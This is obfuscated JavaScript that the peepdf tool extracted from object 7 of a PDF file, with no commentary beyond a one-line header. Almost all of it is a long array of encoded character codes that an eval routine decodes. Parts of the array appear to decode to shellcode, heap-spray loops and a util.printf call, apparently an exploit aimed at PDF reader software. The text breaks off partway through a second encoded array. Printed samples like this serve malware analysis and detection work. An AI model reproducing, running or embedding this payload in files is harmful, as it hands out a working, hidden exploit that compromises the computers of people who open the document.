// peepdf comment: Javascript code located in object 7 (version 0)

var cftx = '';
hjkuw = "";
var cijxy = "cijxy",
    louvx = 35265,
    cpquvy = false,
    npqtwy = "npqtwy",
    dehm = 43866,
    dkluw = 0,
    abiov = String,
    bnqwx = abiov['fDrQoxmDCxhxayryCQoxdQex'.replace(/[xNDyQ]/g, '')],
    bdfmo = String,
    ijnyz = bdfmo['eUvDa5lD'.replace(/[DqU52]/g, '')],
    cfos = "98",
    ioquv = "",
    chpruw = [70, 66, 66, 158, 174, 166, 156, 172, 162, 167, 167, 88, 159, 161, 177, 151, 162, 172, 97, 177, 154, 170, 172, 168, 101, 88, 165, 157, 167, 97, 180, 69, 67, 65, 66, 175, 161, 161, 165, 157, 89, 96, 178, 153, 171, 171, 169, 102, 165, 157, 167, 159, 173, 160, 89, 98, 89, 106, 89, 116, 89, 164, 158, 166, 98, 179, 70, 66, 66, 65, 66, 177, 154, 170, 172, 168, 89, 99, 118, 88, 178, 153, 171, 171, 169, 115, 70, 66, 66, 65, 182, 69, 67, 65, 66, 177, 154, 170, 172, 168, 89, 117, 89, 177, 154, 170, 172, 168, 103, 171, 174, 154, 172, 172, 171, 161, 167, 159, 97, 104, 101, 88, 165, 157, 167, 103, 107, 97, 116, 69, 67, 65, 66, 170, 158, 172, 174, 170, 167, 88, 178, 153, 171, 171, 169, 115, 70, 66, 66, 181, 70, 66, 70, 66, 66, 158, 174, 166, 156, 172, 162, 167, 167, 88, 174, 172, 162, 164, 152, 168, 171, 161, 167, 172, 159, 96, 98, 179, 70, 66, 66, 65, 175, 153, 171, 88, 169, 153, 178, 164, 168, 153, 157, 88, 118, 88, 174, 166, 158, 171, 156, 153, 169, 157, 97, 90, 94, 173, 126, 122, 126, 113, 94, 173, 105, 104, 105, 105, 94, 173, 110, 110, 105, 104, 94, 173, 122, 105, 111, 108, 94, 173, 105, 104, 108, 104, 94, 173, 105, 104, 105, 104, 94, 173, 109, 104, 113, 122, 94, 173, 113, 122, 105, 123, 94, 173, 106, 123, 112, 104, 94, 173, 113, 122, 122, 124, 94, 173, 105, 112, 109, 104, 94, 173, 124, 107, 110, 125, 94, 173, 113, 122, 110, 109, 94, 173, 113, 122, 126, 123, 94, 173, 105, 112, 109, 109, 94, 173, 108, 107, 110, 106, 94, 173, 124, 105, 125, 106, 94, 173, 105, 107, 124, 106, 94, 173, 106, 104, 108, 106, 94, 173, 113, 104, 109, 104, 94, 173, 105, 104, 108, 112, 94, 173, 127, 109, 112, 109, 94, 173, 124, 106, 113, 122, 94, 173, 110, 124, 110, 121, 94, 173, 105, 108, 124, 106, 94, 173, 110, 109, 105, 104, 94, 173, 126, 123, 113, 122, 94, 173, 110, 105, 110, 105, 94, 173, 110, 110, 110, 107, 94, 173, 111, 104, 110, 111, 94, 173, 110, 124, 113, 122, 94, 173, 108, 107, 105, 112, 94, 173, 113, 122, 124, 104, 94, 173, 105, 123, 112, 109, 94, 173, 127, 125, 113, 122, 94, 173, 112, 110, 105, 107, 94, 173, 113, 122, 108, 123, 94, 173, 112, 112, 109, 125, 94, 173, 124, 126, 105, 107, 94, 173, 110, 105, 113, 122, 94, 173, 110, 106, 106, 123, 94, 173, 110, 105, 113, 122, 94, 173, 110, 106, 107, 108, 94, 173, 112, 105, 113, 122, 94, 173, 109, 125, 106, 108, 94, 173, 112, 109, 113, 113, 94, 173, 113, 122, 127, 123, 94, 173, 107, 104, 112, 105, 94, 173, 127, 111, 105, 107, 94, 173, 109, 121, 114, 113, 94, 173, 109, 106, 122, 124, 94, 173, 108, 122, 111, 104, 94, 173, 127, 123, 110, 109, 94, 173, 105, 108, 112, 109, 94, 173, 124, 104, 108, 107, 94, 173, 108, 111, 126, 122, 94, 173, 127, 126, 108, 107, 94, 173, 109, 109, 105, 107, 94, 173, 114, 111, 105, 123, 94, 173, 124, 126, 113, 122, 94, 173, 112, 109, 122, 125, 94, 173, 107, 122, 127, 124, 94, 173, 109, 126, 127, 113, 94, 173, 126, 112, 110, 105, 94, 173, 127, 126, 114, 108, 94, 173, 127, 126, 127, 126, 94, 173, 124, 107, 108, 122, 94, 173, 112, 108, 111, 105, 94, 173, 126, 122, 105, 106, 94, 173, 113, 122, 125, 113, 94, 173, 105, 123, 109, 109, 94, 173, 110, 125, 114, 106, 94, 173, 127, 106, 105, 107, 94, 173, 126, 104, 125, 105, 94, 173, 124, 110, 105, 107, 94, 173, 124, 113, 108, 107, 94, 173, 123, 111, 105, 126, 94, 173, 110, 126, 105, 112, 94, 173, 126, 105, 124, 105, 94, 173, 105, 107, 105, 106, 94, 173, 105, 107, 124, 121, 94, 173, 113, 122, 124, 126, 94, 173, 105, 107, 105, 105, 94, 173, 113, 113, 124, 106, 94, 173, 127, 112, 109, 109, 94, 173, 113, 122, 111, 105, 94, 173, 127, 112, 109, 109, 94, 173, 110, 125, 110, 126, 94, 173, 124, 113, 110, 122, 94, 173, 110, 109, 124, 107, 94, 173, 126, 123, 113, 122, 94, 173, 126, 112, 110, 105, 94, 173, 127, 126, 109, 113, 94, 173, 127, 126, 127, 126, 94, 173, 111, 112, 110, 104, 94, 173, 111, 104, 126, 112, 94, 173, 105, 108, 123, 126, 94, 173, 111, 123, 126, 112, 94, 173, 127, 126, 127, 126, 94, 173, 108, 107, 127, 126, 94, 173, 110, 106, 125, 106, 94, 173, 127, 126, 110, 106, 94, 173, 105, 112, 112, 109, 94, 173, 125, 104, 127, 126, 94, 173, 109, 109, 113, 113, 94, 173, 113, 122, 127, 123, 94, 173, 127, 123, 109, 109, 94, 173, 124, 107, 124, 113, 94, 173, 113, 122, 110, 109, 94, 173, 113, 107, 126, 123, 94, 173, 105, 123, 126, 123, 94, 173, 109, 109, 113, 124, 94, 173, 110, 104, 127, 108, 94, 173, 109, 109, 124, 110, 94, 173, 112, 109, 127, 108, 94, 173, 109, 109, 124, 110, 94, 173, 112, 106, 127, 109, 94, 173, 109, 109, 124, 110, 94, 173, 111, 123, 127, 110, 94, 173, 109, 109, 124, 110, 94, 173, 111, 124, 127, 111, 94, 173, 109, 109, 124, 110, 94, 173, 111, 126, 127, 112, 94, 173, 109, 109, 124, 110, 94, 173, 111, 125, 127, 113, 94, 173, 109, 109, 124, 110, 94, 173, 107, 125, 127, 121, 94, 173, 109, 109, 124, 110, 94, 173, 111, 108, 127, 122, 94, 173, 109, 109, 124, 110, 94, 173, 111, 123, 127, 123, 94, 173, 109, 109, 124, 110, 94, 173, 111, 123, 127, 124, 94, 173, 109, 109, 124, 110, 94, 173, 105, 104, 127, 125, 94, 173, 122, 104, 126, 112, 94, 173, 127, 126, 127, 126, 94, 173, 110, 104, 127, 126, 94, 173, 110, 124, 111, 112, 94, 173, 106, 105, 113, 121, 94, 173, 126, 112, 106, 110, 94, 173, 127, 126, 106, 109, 94, 173, 127, 126, 127, 126, 94, 173, 124, 108, 113, 107, 94, 173, 113, 109, 105, 123, 94, 173, 112, 108, 124, 104, 94, 173, 111, 121, 106, 109, 94, 173, 111, 121, 105, 104, 94, 173, 127, 126, 105, 104, 94, 173, 105, 123, 112, 109, 94, 173, 112, 109, 127, 126, 94, 173, 111, 121, 105, 112, 94, 173, 127, 126, 105, 104, 94, 173, 113, 109, 125, 104, 94, 173, 112, 109, 124, 104, 94, 173, 109, 104, 105, 107, 94, 173, 124, 107, 124, 113, 94, 173, 124, 104, 108, 107, 94, 173, 124, 107, 124, 113, 94, 173, 108, 107, 110, 111, 94, 173, 113, 122, 124, 104, 94, 173, 107, 108, 109, 123, 94, 173, 113, 122, 105, 123, 94, 173, 107, 108, 112, 123, 94, 173, 127, 123, 105, 112, 94, 173, 122, 121, 127, 107, 94, 173, 124, 107, 110, 126, 94, 173, 109, 123, 113, 122, 94, 173, 105, 108, 107, 108, 94, 173, 108, 113, 113, 104, 94, 173, 113, 122, 105, 104, 94, 173, 112, 108, 124, 105, 94, 173, 109, 104, 105, 110, 94, 173, 108, 112, 113, 104, 94, 173, 112, 109, 105, 104, 94, 173, 107, 122, 127, 121, 94, 173, 124, 107, 124, 105, 94, 173, 113, 122, 110, 109, 94, 173, 113, 107, 126, 123, 94, 173, 111, 108, 126, 123, 94, 173, 113, 124, 110, 107, 94, 173, 127, 104, 109, 109, 94, 173, 108, 107, 110, 111, 94, 173, 110, 104, 125, 122, 94, 173, 109, 109, 124, 110, 94, 173, 111, 122, 127, 104, 94, 173, 109, 109, 124, 110, 94, 173, 111, 109, 127, 105, 94, 173, 109, 109, 124, 110, 94, 173, 112, 106, 127, 106, 94, 173, 109, 109, 124, 110, 94, 173, 111, 125, 127, 107, 94, 173, 109, 109, 124, 110, 94, 173, 111, 109, 127, 108, 94, 173, 109, 109, 124, 110, 94, 173, 111, 123, 127, 109, 94, 173, 109, 109, 124, 110, 94, 173, 108, 107, 127, 110, 94, 173, 109, 109, 124, 110, 94, 173, 108, 106, 127, 111, 94, 173, 109, 109, 124, 110, 94, 173, 107, 125, 127, 112, 94, 173, 109, 109, 124, 110, 94, 173, 111, 108, 127, 113, 94, 173, 109, 109, 124, 110, 94, 173, 111, 123, 127, 121, 94, 173, 109, 109, 124, 110, 94, 173, 111, 123, 127, 122, 94, 173, 110, 124, 113, 112, 94, 173, 126, 112, 127, 123, 94, 173, 127, 126, 105, 122, 94, 173, 127, 126, 127, 126, 94, 173, 111, 112, 110, 104, 94, 173, 109, 107, 111, 112, 94, 173, 113, 125, 127, 113, 94, 173, 113, 104, 126, 112, 94, 173, 127, 126, 127, 125, 94, 173, 113, 122, 127, 126, 94, 173, 113, 124, 127, 112, 94, 173, 114, 123, 109, 109, 94, 173, 109, 108, 111, 121, 94, 173, 126, 112, 110, 104, 94, 173, 127, 126, 112, 125, 94, 173, 127, 126, 127, 126, 94, 173, 109, 109, 113, 124, 94, 173, 111, 121, 126, 104, 94, 173, 110, 104, 106, 104, 94, 173, 112, 107, 126, 112, 94, 173, 127, 126, 127, 126, 94, 173, 113, 107, 127, 126, 94, 173, 106, 123, 124, 108, 94, 173, 109, 109, 113, 124, 94, 173, 110, 104, 126, 104, 94, 173, 109, 109, 113, 124, 94, 173, 110, 104, 114, 123, 94, 173, 110, 107, 110, 107, 94, 173, 110, 107, 110, 107, 94, 173, 110, 107, 110, 107, 94, 173, 112, 109, 127, 126, 94, 173, 124, 111, 105, 112, 94, 173, 114, 123, 109, 109, 94, 173, 105, 104, 109, 108, 94, 173, 105, 104, 105, 104, 94, 173, 127, 126, 110, 107, 94, 173, 110, 126, 125, 111, 94, 173, 123, 110, 105, 126, 94, 173, 110, 122, 124, 104, 94, 173, 124, 107, 124, 113, 94, 173, 113, 122, 110, 109, 94, 173, 110, 105, 126, 123, 94, 173, 110, 107, 110, 105, 94, 173, 110, 111, 110, 110, 94, 173, 109, 106, 111, 121, 94, 173, 112, 106, 126, 112, 94, 173, 105, 104, 105, 104, 94, 173, 113, 122, 105, 104, 94, 173, 108, 107, 125, 112, 94, 173, 113, 109, 127, 110, 94, 173, 110, 113, 125, 122, 94, 173, 109, 109, 124, 111, 94, 173, 111, 105, 127, 112, 94, 173, 111, 109, 107, 125, 94, 173, 124, 111, 112, 112, 94, 173, 127, 123, 109, 109, 94, 173, 105, 104, 111, 109, 94, 173, 105, 104, 105, 104, 94, 173, 110, 110, 112, 125, 94, 173, 109, 109, 113, 124, 94, 173, 110, 104, 127, 112, 94, 173, 126, 112, 110, 110, 94, 173, 105, 104, 110, 105, 94, 173, 105, 104, 105, 104, 94, 173, 110, 104, 110, 113, 94, 173, 123, 105, 126, 112, 94, 173, 127, 126, 127, 125, 94, 173, 113, 109, 127, 126, 94, 173, 110, 113, 124, 104, 94, 173, 112, 108, 110, 113, 94, 173, 113, 124, 108, 113, 94, 173, 105, 105, 109, 110, 94, 173, 126, 112, 110, 104, 94, 173, 105, 104, 108, 122, 94, 173, 105, 104, 105, 104, 94, 173, 127, 112, 113, 122, 94, 173, 109, 109, 113, 124, 94, 173, 110, 104, 127, 112, 94, 173, 107, 105, 126, 112, 94, 173, 127, 126, 127, 126, 94, 173, 113, 109, 127, 126, 94, 173, 110, 113, 124, 104, 94, 173, 112, 108, 110, 113, 94, 173, 110, 111, 105, 123, 94, 173, 105, 105, 126, 112, 94, 173, 127, 126, 127, 126, 94, 173, 110, 113, 127, 126, 94, 173, 109, 108, 124, 110, 94, 173, 127, 126, 108, 112, 94, 173, 110, 104, 112, 107, 94, 173, 109, 109, 113, 124, 94, 173, 127, 125, 127, 112, 94, 173, 110, 112, 105, 104, 94, 173, 109, 109, 113, 124, 94, 173, 110, 104, 127, 112, 94, 173, 126, 112, 110, 111, 94, 173, 127, 125, 112, 108, 94, 173, 127, 126, 127, 126, 94, 173, 110, 113, 110, 113, 94, 173, 109, 110, 109, 110, 94, 173, 127, 107, 108, 122, 94, 173, 122, 121, 112, 123, 94, 173, 110, 125, 110, 126, 94, 173, 124, 113, 110, 122, 94, 173, 110, 109, 124, 107, 94, 173, 126, 123, 113, 122, 94, 173, 110, 107, 110, 105, 94, 173, 111, 104, 111, 110, 94, 173, 108, 106, 123, 105, 94, 173, 105, 104, 126, 112, 94, 173, 105, 104, 105, 104, 94, 173, 110, 112, 105, 104, 94, 173, 105, 112, 108, 112, 94, 173, 105, 107, 112, 108, 94, 173, 126, 122, 109, 104, 94, 173, 109, 104, 127, 113, 94, 173, 110, 124, 113, 122, 94, 173, 113, 104, 105, 112, 94, 173, 109, 106, 127, 122, 94, 173, 105, 112, 112, 109, 94, 173, 125, 122, 108, 107, 94, 173, 106, 112, 113, 121, 94, 173, 124, 107, 113, 122, 94, 173, 106, 111, 126, 122, 94, 173, 106, 112, 108, 112, 94, 173, 106, 105, 112, 110, 94, 173, 108, 107, 109, 104, 94, 173, 113, 108, 124, 113, 94, 173, 112, 108, 125, 122, 94, 173, 109, 104, 105, 123, 94, 173, 105, 112, 108, 112, 94, 173, 127, 122, 112, 109, 94, 173, 127, 125, 109, 104, 94, 173, 126, 122, 124, 122, 94, 173, 108, 107, 127, 106, 94, 173, 113, 113, 124, 104, 94, 173, 127, 123, 109, 109, 94, 173, 109, 109, 113, 122, 94, 173, 110, 122, 127, 123, 94, 173, 124, 107, 124, 113, 94, 173, 105, 105, 108, 106, 94, 173, 112, 108, 111, 112, 94, 173, 112, 104, 112, 108, 94, 173, 107, 126, 108, 121, 94, 173, 112, 106, 107, 126, 94, 173, 111, 111, 111, 109, 94, 173, 111, 113, 112, 108, 94, 173, 111, 109, 111, 124, 94, 173, 107, 125, 112, 106, 94, 173, 111, 125, 111, 107, 94, 173, 112, 104, 107, 126, 94, 173, 111, 126, 112, 106, 94, 173, 111, 126, 111, 124, 94, 173, 111, 107, 107, 126, 94, 173, 111, 124, 111, 109, 94, 173, 112, 108, 111, 126, 94, 173, 107, 125, 108, 106, 94, 173, 112, 112, 111, 109, 94, 173, 105, 104, 111, 109, 91, 97, 116, 69, 67, 65, 66, 174, 154, 170, 89, 166, 168, 168, 89, 117, 89, 173, 167, 157, 172, 155, 154, 168, 158, 96, 91, 93, 174, 104, 122, 104, 122, 93, 174, 104, 122, 104, 122, 93, 174, 104, 122, 104, 122, 93, 174, 104, 122, 104, 122, 90, 98, 69, 67, 65, 66, 174, 154, 170, 89, 160, 158, 153, 169, 154, 165, 167, 156, 163, 89, 117, 89, 166, 168, 168, 89, 99, 89, 168, 154, 177, 165, 167, 154, 156, 116, 69, 67, 65, 66, 174, 154, 170, 89, 154, 162, 159, 155, 164, 168, 155, 164, 88, 118, 88, 174, 166, 158, 171, 156, 153, 169, 157, 97, 90, 94, 173, 105, 121, 105, 121, 94, 173, 105, 121, 105, 121, 91, 97, 116, 69, 67, 65, 66, 174, 154, 170, 89, 160, 158, 153, 157, 157, 171, 171, 162, 178, 158, 88, 118, 88, 107, 104, 116, 69, 67, 65, 66, 174, 154, 170, 89, 171, 169, 170, 154, 177, 89, 117, 89, 160, 158, 153, 157, 157, 171, 171, 162, 178, 158, 88, 100, 88, 161, 157, 154, 168, 155, 164, 168, 155, 164, 102, 165, 157, 167, 159, 173, 160, 116, 69, 67, 65, 66, 175, 161, 161, 165, 157, 89, 96, 155, 161, 160, 154, 165, 167, 156, 163, 103, 164, 158, 166, 160, 172, 161, 88, 117, 88, 172, 168, 171, 153, 178, 97, 180, 69, 67, 65, 66, 65, 155, 161, 160, 154, 165, 167, 156, 163, 89, 99, 118, 88, 155, 161, 160, 154, 165, 167, 156, 163, 116, 69, 67, 65, 66, 181, 70, 66, 66, 65, 175, 153, 171, 88, 159, 161, 165, 164, 155, 164, 168, 155, 164, 88, 118, 88, 155, 161, 160, 154, 165, 167, 156, 163, 103, 171, 174, 154, 172, 172, 171, 161, 167, 159, 97, 104, 101, 88, 172, 168, 171, 153, 178, 97, 116, 69, 67, 65, 66, 174, 154, 170, 89, 154, 165, 167, 156, 163, 89, 117, 89, 154, 162, 159, 155, 164, 168, 155, 164, 102, 172, 173, 155, 171, 173, 170, 162, 166, 160, 96, 105, 100, 89, 154, 162, 159, 155, 164, 168, 155, 164, 102, 165, 157, 167, 159, 173, 160, 102, 171, 169, 170, 154, 177, 98, 115, 70, 66, 66, 65, 176, 160, 162, 164, 158, 88, 97, 154, 165, 167, 156, 163, 103, 164, 158, 166, 160, 172, 161, 99, 172, 168, 171, 153, 178, 88, 117, 88, 105, 176, 109, 104, 105, 104, 105, 97, 180, 69, 67, 65, 66, 65, 155, 164, 168, 155, 164, 88, 118, 88, 155, 164, 168, 155, 164, 88, 100, 88, 155, 164, 168, 155, 164, 88, 100, 88, 159, 161, 165, 164, 155, 164, 168, 155, 164, 115, 70, 66, 66, 65, 182, 69, 67, 65, 66, 174, 154, 170, 89, 165, 158, 165, 152, 153, 171, 170, 154, 177, 89, 117, 89, 166, 158, 175, 89, 121, 171, 170, 154, 177, 97, 97, 116, 69, 67, 65, 66, 158, 168, 170, 89, 96, 175, 153, 171, 88, 162, 88, 118, 88, 105, 115, 89, 161, 89, 116, 89, 105, 109, 104, 105, 115, 89, 161, 100, 99, 98, 179, 70, 66, 66, 65, 66, 165, 158, 165, 152, 153, 171, 170, 154, 177, 148, 161, 150, 88, 118, 88, 155, 164, 168, 155, 164, 88, 100, 88, 161, 157, 154, 168, 155, 164, 168, 155, 164, 115, 70, 66, 66, 65, 182, 69, 67, 65, 66, 174, 154, 170, 89, 166, 174, 165, 89, 117, 89, 105, 107, 113, 114, 113, 114, 113, 114, 113, 114, 113, 114, 113, 114, 113, 114, 113, 114, 113, 114, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 112, 113, 115, 70, 66, 66, 65, 174, 172, 162, 164, 103, 168, 171, 161, 167, 172, 159, 96, 91, 93, 109, 109, 105, 104, 105, 158, 91, 100, 89, 166, 174, 165, 98, 115, 70, 66, 66, 181, 70, 66, 70, 66, 66, 158, 174, 166, 156, 172, 162, 167, 167, 88, 156, 167, 165, 164, 154, 154, 152, 157, 166, 153, 162, 164, 97, 97, 180, 69, 67, 65, 66, 174, 154, 170, 89, 171, 161, 157, 165, 164, 156, 167, 157, 157, 89, 117, 89, 173, 167, 157, 172, 155, 154, 168, 158, 96, 91, 93, 174, 125, 123, 125, 114, 93, 174, 104, 105, 104, 106, 93, 174, 109, 111, 104, 105, 93, 174, 121, 106, 110, 109, 93, 174, 104, 105, 107, 105, 93, 174, 104, 105, 104, 105, 93, 174, 108, 105, 112, 123, 93, 174, 112, 123, 104, 124, 93, 174, 105, 124, 111, 105, 93, 174, 112, 123, 121, 125, 93, 174, 104, 113, 108, 105, 93, 174, 123, 108, 109, 126, 93, 174, 112, 123, 109, 110, 93, 174, 112, 123, 125, 124, 93, 174, 104, 113, 108, 110, 93, 174, 107, 108, 109, 107, 93, 174, 123, 106, 124, 107, 93, 174, 104, 108, 123, 107, 93, 174, 105, 105, 107, 107, 93, 174, 112, 105, 108, 105, 93, 174, 104, 105, 107, 113, 93, 174, 126, 110, 111, 110, 93, 174, 123, 107, 112, 123, 93, 174, 109, 125, 109, 122, 93, 174, 104, 109, 123, 107, 93, 174, 109, 110, 104, 105, 93, 174, 125, 124, 112, 123, 93, 174, 109, 106, 109, 106, 93, 174, 109, 111, 109, 108, 93, 174, 110, 105, 109, 112, 93, 174, 109, 125, 112, 123, 93, 174, 107, 108, 104, 113, 93, 174, 112, 123, 123, 105, 93, 174, 104, 124, 111, 110, 93, 174, 126, 126, 112, 123, 93, 174, 111, 111, 104, 108, 93, 174, 112, 123, 107, 124, 93, 174, 111, 113, 108, 126, 93, 174, 123, 127, 104, 108, 93, 174, 109, 106, 112, 123, 93, 174, 109, 107, 105, 124, 93, 174, 109, 106, 112, 123, 93, 174, 109, 107, 106, 109, 93, 174, 111, 106, 112, 123, 93, 174, 108, 126, 105, 109, 93, 174, 111, 110, 112, 114, 93, 174, 112, 123, 126, 124, 93, 174, 106, 105, 111, 106, 93, 174, 126, 112, 104, 108, 93, 174, 108, 122, 113, 114, 93, 174, 108, 107, 121, 125, 93, 174, 107, 123, 110, 105, 93, 174, 126, 124, 109, 110, 93, 174, 104, 109, 111, 110, 93, 174, 123, 105, 107, 108, 93, 174, 107, 112, 125, 123, 93, 174, 126, 127, 107, 108, 93, 174, 108, 110, 104, 108, 93, 174, 113, 112, 104, 124, 93, 174, 123, 127, 112, 123, 93, 174, 111, 110, 121, 126, 93, 174, 106, 123, 126, 125, 93, 174, 108, 127, 126, 114, 93, 174, 125, 113, 109, 106, 93, 174, 126, 127, 113, 109, 93, 174, 126, 127, 126, 127, 93, 174, 123, 108, 107, 123, 93, 174, 111, 109, 110, 106, 93, 174, 125, 123, 104, 107, 93, 174, 112, 123, 124, 114, 93, 174, 104, 124, 108, 110, 93, 174, 109, 126, 113, 107, 93, 174, 126, 107, 104, 108, 93, 174, 125, 105, 124, 106, 93, 174, 123, 111, 104, 108, 93, 174, 123, 114, 107, 108, 93, 174, 122, 112, 104, 127, 93, 174, 109, 127, 104, 113, 93, 174, 125, 106, 123, 106, 93, 174, 104, 108, 104, 107, 93, 174, 104, 108, 123, 122, 93, 174, 112, 123, 123, 127, 93, 174, 104, 108, 104, 106, 93, 174, 112, 114, 123, 107, 93, 174, 126, 113, 108, 110, 93, 174, 112, 123, 110, 106, 93, 174, 126, 113, 108, 110, 93, 174, 109, 126, 109, 127, 93, 174, 123, 114, 109, 123, 93, 174, 109, 110, 123, 108, 93, 174, 125, 124, 112, 123, 93, 174, 125, 113, 109, 106, 93, 174, 126, 127, 108, 114, 93, 174, 126, 127, 126, 127, 93, 174, 110, 113, 109, 105, 93, 174, 110, 105, 125, 113, 93, 174, 104, 109, 122, 127, 93, 174, 110, 124, 125, 113, 93, 174, 126, 127, 126, 127, 93, 174, 107, 108, 126, 127, 93, 174, 109, 107, 124, 107, 93, 174, 126, 127, 109, 107, 93, 174, 104, 113, 111, 110, 93, 174, 124, 105, 126, 127, 93, 174, 108, 110, 112, 114, 93, 174, 112, 123, 126, 124, 93, 174, 126, 124, 108, 110, 93, 174, 123, 108, 123, 114, 93, 174, 112, 123, 109, 110, 93, 174, 112, 108, 125, 124, 93, 174, 104, 124, 125, 124, 93, 174, 108, 110, 112, 125, 93, 174, 109, 105, 126, 109, 93, 174, 108, 110, 123, 111, 93, 174, 111, 110, 126, 109, 93, 174, 108, 110, 123, 111, 93, 174, 111, 107, 126, 110, 93, 174, 108, 110, 123, 111, 93, 174, 110, 124, 126, 111, 93, 174, 108, 110, 123, 111, 93, 174, 110, 125, 126, 112, 93, 174, 108, 110, 123, 111, 93, 174, 110, 127, 126, 113, 93, 174, 108, 110, 123, 111, 93, 174, 110, 126, 126, 114, 93, 174, 108, 110, 123, 111, 93, 174, 106, 126, 126, 122, 93, 174, 108, 110, 123, 111, 93, 174, 110, 109, 126, 123, 93, 174, 108, 110, 123, 111, 93, 174, 110, 124, 126, 124, 93, 174, 108, 110, 123, 111, 93, 174, 110, 124, 126, 125, 93, 174, 108, 110, 123, 111, 93, 174, 104, 105, 126, 126, 93, 174, 121, 105, 125, 113, 93, 174, 126, 127, 126, 127, 93, 174, 109, 105, 126, 127, 93, 174, 109, 125, 110, 113, 93, 174, 105, 106, 112, 122, 93, 174, 125, 113, 105, 111, 93, 174, 126, 127, 105, 110, 93, 174, 126, 127, 126, 127, 93, 174, 123, 109, 112, 108, 93, 174, 112, 110, 104, 124, 93, 174, 111, 109, 123, 105, 93, 174, 110, 122, 105, 110, 93, 174, 110, 122, 104, 105, 93, 174, 126, 127, 104, 105, 93, 174, 104, 124, 111, 110, 93, 174, 111, 110, 126, 127, 93, 174, 110, 122, 104, 113, 93, 174, 126, 127, 104, 105, 93, 174, 112, 110, 124, 105, 93, 174, 111, 110, 123, 105, 93, 174, 108, 105, 104, 108, 93, 174, 123, 108, 123, 114, 93, 174, 123, 105, 107, 108, 93, 174, 123, 108, 123, 114, 93, 174, 107, 108, 109, 112, 93, 174, 112, 123, 123, 105, 93, 174, 106, 109, 108, 124, 93, 174, 112, 123, 104, 124, 93, 174, 106, 109, 111, 124, 93, 174, 126, 124, 104, 113, 93, 174, 121, 122, 126, 108, 93, 174, 123, 108, 109, 127, 93, 174, 108, 124, 112, 123, 93, 174, 104, 109, 106, 109, 93, 174, 107, 114, 112, 105, 93, 174, 112, 123, 104, 105, 93, 174, 111, 109, 123, 106, 93, 174, 108, 105, 104, 111, 93, 174, 107, 113, 112, 105, 93, 174, 111, 110, 104, 105, 93, 174, 106, 123, 126, 122, 93, 174, 123, 108, 123, 106, 93, 174, 112, 123, 109, 110, 93, 174, 112, 108, 125, 124, 93, 174, 110, 109, 125, 124, 93, 174, 112, 125, 109, 108, 93, 174, 126, 105, 108, 110, 93, 174, 107, 108, 109, 112, 93, 174, 109, 105, 124, 123, 93, 174, 108, 110, 123, 111, 93, 174, 110, 123, 126, 105, 93, 174, 108, 110, 123, 111, 93, 174, 110, 110, 126, 106, 93, 174, 108, 110, 123, 111, 93, 174, 111, 107, 126, 107, 93, 174, 108, 110, 123, 111, 93, 174, 110, 126, 126, 108, 93, 174, 108, 110, 123, 111, 93, 174, 110, 110, 126, 109, 93, 174, 108, 110, 123, 111, 93, 174, 110, 124, 126, 110, 93, 174, 108, 110, 123, 111, 93, 174, 107, 108, 126, 111, 93, 174, 108, 110, 123, 111, 93, 174, 107, 107, 126, 112, 93, 174, 108, 110, 123, 111, 93, 174, 106, 126, 126, 113, 93, 174, 108, 110, 123, 111, 93, 174, 110, 109, 126, 114, 93, 174, 108, 110, 123, 111, 93, 174, 110, 124, 126, 122, 93, 174, 108, 110, 123, 111, 93, 174, 110, 124, 126, 123, 93, 174, 109, 125, 112, 113, 93, 174, 125, 113, 126, 124, 93, 174, 126, 127, 104, 123, 93, 174, 126, 127, 126, 127, 93, 174, 110, 113, 109, 105, 93, 174, 108, 108, 110, 113, 93, 174, 112, 126, 126, 114, 93, 174, 112, 105, 125, 113, 93, 174, 126, 127, 126, 126, 93, 174, 112, 123, 126, 127, 93, 174, 112, 125, 126, 113, 93, 174, 113, 124, 108, 110, 93, 174, 108, 109, 110, 122, 93, 174, 125, 113, 109, 105, 93, 174, 126, 127, 111, 126, 93, 174, 126, 127, 126, 127, 93, 174, 108, 110, 112, 125, 93, 174, 110, 122, 125, 105, 93, 174, 109, 105, 105, 105, 93, 174, 111, 108, 125, 113, 93, 174, 126, 127, 126, 127, 93, 174, 112, 108, 126, 127, 93, 174, 105, 124, 123, 109, 93, 174, 108, 110, 112, 125, 93, 174, 109, 105, 125, 105, 93, 174, 108, 110, 112, 125, 93, 174, 109, 105, 113, 124, 93, 174, 109, 108, 109, 108, 93, 174, 109, 108, 109, 108, 93, 174, 109, 108, 109, 108, 93, 174, 111, 110, 126, 127, 93, 174, 123, 112, 104, 113, 93, 174, 113, 124, 108, 110, 93, 174, 104, 105, 108, 109, 93, 174, 104, 105, 104, 105, 93, 174, 126, 127, 109, 108, 93, 174, 109, 127, 124, 112, 93, 174, 122, 111, 104, 127, 93, 174, 109, 123, 123, 105, 93, 174, 123, 108, 123, 114, 93, 174, 112, 123, 109, 110, 93, 174, 109, 106, 125, 124, 93, 174, 109, 108, 109, 106, 93, 174, 109, 112, 109, 111, 93, 174, 108, 107, 110, 122, 93, 174, 111, 107, 125, 113, 93, 174, 104, 105, 104, 105, 93, 